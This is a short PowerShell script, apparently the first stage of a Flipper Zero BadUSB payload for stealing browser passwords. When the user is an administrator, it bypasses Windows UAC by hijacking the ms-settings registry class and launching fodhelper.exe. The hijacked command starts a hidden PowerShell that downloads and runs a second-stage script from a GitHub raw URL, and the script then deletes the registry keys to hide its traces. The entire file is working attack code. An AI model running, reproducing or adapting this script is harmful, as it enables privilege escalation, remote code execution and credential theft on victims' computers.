function s1 {
	$user = "$env:COMPUTERNAME\$env:USERNAME"
	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
if($isAdmin){
	$fuck="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-BrowserPasswords/s2.ps1 | iex";
	reg add "HKCU\Software\Classes\.fuck\Shell\Open\command" /d $fuck /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".fuck" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.fuck\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;

	}
	else{
	Break
	}
}

s1
